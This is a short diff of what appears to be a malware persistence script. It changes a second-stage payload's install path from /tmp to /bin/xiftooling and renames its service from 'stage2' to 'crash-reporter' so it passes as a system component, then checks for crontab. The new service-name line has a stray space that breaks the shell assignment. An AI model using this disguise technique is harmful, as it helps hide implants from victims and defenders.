@@ -1,5 +1,5 @@
-stage_2_persistent_path="/tmp/stage2.sh"
-stage_2_service_name="stage2"
+stage_2_persistent_path="/bin/xiftooling"
+stage_2_service_name= "crash-reporter"
 
 echo "[+] Checking for crontab..."
 crontab -l 2>/dev/null 1>/dev/null
